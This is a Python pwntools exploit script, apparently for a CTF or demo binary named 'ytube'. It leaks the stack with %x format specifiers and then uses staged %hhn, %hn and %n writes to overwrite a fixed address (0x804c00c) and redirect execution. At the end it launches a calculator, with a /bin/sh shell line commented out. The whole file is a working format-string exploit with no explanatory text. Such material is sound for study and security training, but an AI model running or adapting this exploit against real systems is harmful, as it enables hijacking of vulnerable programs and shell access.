#!/usr/bin/python2

from pwn import *
import sys

LOCAL = True
BINARY = "./ytube"

"""
    initializing global variables
"""

cnt=0
ESP=None
maxIndex=200
stack=dict()
redirAddress=0x80491a2
rewriteAddress=0x804c00c
upperHalf=rewriteAddress>>16
lowerHalf=rewriteAddress&0x0000ffff
position=0

def counter(num,size):
    global cnt 
    i=0
    while((cnt+i)&size!=num):i+=1
    cnt+=i
    return i

def getIndex(address):
    return ((int(address,16)-ESP)/4)
def getAddress(index):
    return hex(ESP+index*4)

def makeAddress(address, val, position='back'):
    
    size=((len(hex(val)[2:])/2)+(len(hex(val)[2:])%2))*2
    if position is 'back': address=address[:-size]+hex(val)[2:].zfill(size)
    else: address=hex(val)[2:].zfill(size)+address[size:]
    
    return address

def adjustSize(bufString):
    num=0
    for i in range(0,len(bufString),2):
        if bufString[i]=='%'and bufString[i+1]=='c':num+=1
        else:
            bufString="%{}c".format(num)+bufString[i:]
            num=0
    print bufString
    return bufString

def leakStack(r,leakSize=maxIndex):
    """
        Should contain a function to get the value of stack and store
        it in an array and return to the calling function
    """
    global ESP
    global stack
    global maxIndex

    buf=""
    leakedStack=dict()
    
    for i in range(1,leakSize+1):
        buf+="{} %{}$x\n".format(i,i)
    r.sendline(buf)
    
    i=0
    while i < leakSize:
        val=r.recvline().strip().split()
        if len(val)>0:
            i+=1
            try:
                leakedStack.update({int(val[0]):val[1]})
            except:
                log.debug(val)
    
    log.debug("Leaked {} values from stack".format(len(leakedStack)))
    # for key,val in leakedStack.items():log.debug(str(key) + " : " + val)
    
    if ESP==None:ESP=int(leakedStack[4],16)-0x30

    stack=leakedStack
    # log.info("Leaked stack of size {}".format(len(stack)))
    if maxIndex<len(stack):maxIndex=len(stack)

def stage1(r):
    
    global cnt
    global maxIndex
    global position
    
    i=0
    buf=""
    stage1Array=[(14,0x00,0xff,"hhn"),(42,0x02,0xff,"hhn")]
    stage2IndexList=[]
    

    while i < len(stage1Array):
        
        currPoint=stage1Array[i][0]

        buf+="%c"*(currPoint-position-2)
        cnt+=(currPoint-position-2)
        
        buf+="%{}c".format(counter(stage1Array[i][1],stage1Array[i][2]))
        # buf+="%p" # Uncomment if you want to see the address being written to
        buf+="%{}".format(stage1Array[i][3])

        newAddressIndex=getIndex(stack[currPoint])
        newAddress=makeAddress(stack[newAddressIndex],stage1Array[i][1])

        log.info("At address {}, Modifying address {} at address {} with {}".format(getAddress(currPoint),stack[newAddressIndex],stack[currPoint],newAddress))
        log.success("Stage 2 index added: {}".format(newAddressIndex))

        stage2IndexList.append((newAddressIndex,newAddress))
        
        log.info("Sending "+buf+" size({}) counter({})".format(len(buf),hex(cnt)))
        log.debug('counter is '+str(cnt))
        
        r.sendline(buf)
        r.recv(cnt+1)

        position=currPoint
        i+=1
        leakStack(r)

    return sorted(stage2IndexList),buf

def stage2(r,indexList,buf):
    
    global cnt
    global maxIndex
    global position
    stage2Array=[]
    stage3IndexList=[]
    stage2AddressList=[upperHalf, lowerHalf] 
    finalIndex=None

    for i in range(len(indexList)):stage2Array.append((indexList[i][0],stage2AddressList[i],0xffff,"hn"))
    
    i=0
    log.debug(stage2Array) 
    while i < len(stage2Array):
        currPoint=stage2Array[i][0]

        buf+="%c"*(currPoint-position-2)
        cnt+=(currPoint-position-2)
        
        buf+="%{}c".format(counter(stage2Array[i][1],stage2Array[i][2]))
        # buf+="%p" # Uncomment if you want to see the address being written to
        buf+="%{}".format(stage2Array[i][3])
        
        newAddressIndex=getIndex(stack[currPoint])

        log.info("At index {}, putting {} at address {}, index {}".format(currPoint, hex(stage2Array[i][1]),stack[currPoint],newAddressIndex))
        log.success("Stage 3 index: {} on address {}".format(newAddressIndex, getAddress(newAddressIndex)))
        
        if finalIndex==None:finalIndex=newAddressIndex

        if newAddressIndex not in stage3IndexList:stage3IndexList.append((newAddressIndex))
        
        log.info("Sending "+buf+" size({}) counter({})".format(len(buf),hex(cnt)))
        log.debug('counter is '+str(cnt))
        
        r.sendline(buf)
        r.recv(cnt+1)
        
        position=currPoint
        i+=1
    
    return finalIndex,buf
        

def stage3(r,index,buf):
    print "final address at {}".format(getAddress(index))
    global position
    global cnt
    stage3Array=[(index,redirAddress,0xffffffff,"n")]
    
    i=0
    while i < len(stage3Array):
        
        buf+="%{}c".format(counter(stage3Array[i][1],stage3Array[i][2]))
        buf+="%{}$n".format(index)
        log.info("Sending "+buf+" size({}) counter({})".format(len(buf),hex(cnt)))
        r.sendline(buf)
        i+=1
    
    return


def exploit(r):
    #overwrite 0x804c00c by 0x80491A2
    
    leakStack(r)
    log.success("-------------------------Starting exploit-------------------------")
    log.indented("Stack Pointer at {}".format(hex(ESP)))
    
    nextStageList,buf=stage1(r)
    log.success("-------------------------Stage 1 done-------------------------")
    finalIndex,buf=stage2(r,nextStageList,buf)
    log.success("-------------------------Stage 2 done-------------------------")
    stage3(r,finalIndex,buf)
    log.success("-------------------------Stage 3 done-------------------------")
    # At this point, we should have shell or calculator
    log.success("Enjoy the Demo")
    # r.sendline('/bin/sh')
    r.sendline('/usr/bin/gnome-calculator')

    r.interactive()
    return

if __name__=="__main__":

    LOCAL = True
    sys.stdout = open('/dev/null','w')
    r = process(BINARY)
    print (util.proc.pidof(r))
    pause()
    exploit(r)
